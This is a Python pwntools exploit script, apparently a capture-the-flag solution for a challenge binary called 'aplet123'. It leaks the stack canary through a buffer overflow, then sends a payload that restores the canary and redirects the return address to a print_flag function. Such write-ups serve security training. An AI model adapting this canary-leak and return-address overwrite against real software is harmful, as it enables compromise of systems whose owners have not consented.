#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./aplet123')
p = remote('chall.lac.tf',31123)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

e = ELF('./aplet123')
# gdb.attach(p)

dig = 'a'*0x40 + 'b'*5 + "i'm"
sla('hello\n',dig)

r = p.recvline()
print(r)
canary = u64(b'\x00'+r[3:10])
info('canary:'+hex(canary))

payload = b'bye'+b'\x00'+ b'a'*0x3c + b'b'*0x8 + p64(canary) + b'c'*0x8 + p64(e.symbols['print_flag'])
sl(payload)
p.interactive()
